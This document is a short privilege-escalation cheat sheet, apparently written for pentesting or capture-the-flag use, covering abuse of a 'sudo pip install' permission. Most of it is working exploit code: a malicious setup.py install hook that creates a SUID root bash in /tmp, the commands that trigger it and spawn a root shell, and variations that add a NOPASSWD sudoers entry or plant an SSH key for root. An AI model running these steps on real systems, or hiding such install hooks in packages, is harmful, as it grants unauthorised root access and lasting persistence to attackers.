# sudo pip Malicious Package

If a user can run `sudo pip install *`, create a malicious `setup.py` in a local directory and install it to execute arbitrary code as root.

## Check sudo
```bash
sudo -l
# Look for: (root) /usr/bin/pip install *
```

## Create Malicious setup.py
```python
from setuptools import setup
from setuptools.command.install import install
import os

class Exploit(install):
    def run(self):
        os.system("cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash")

setup(
    name="exploit",
    cmdclass={"install": Exploit}
)
```

## Install to Trigger
```bash
mkdir /tmp/exploit
cp setup.py /tmp/exploit/
cd /tmp/exploit
sudo pip install .
```

## Get Shell
```bash
/tmp/rootbash -p
```

## Variations
- Read `/root/root.txt` directly in `run()`
- Add user to sudoers: `os.system("echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")`
- Add SSH key to `/root/.ssh/authorized_keys`

## Notes
- Works with `pip install .` (current dir) or `pip install <path>`
- The `install` command class is executed at install time as root
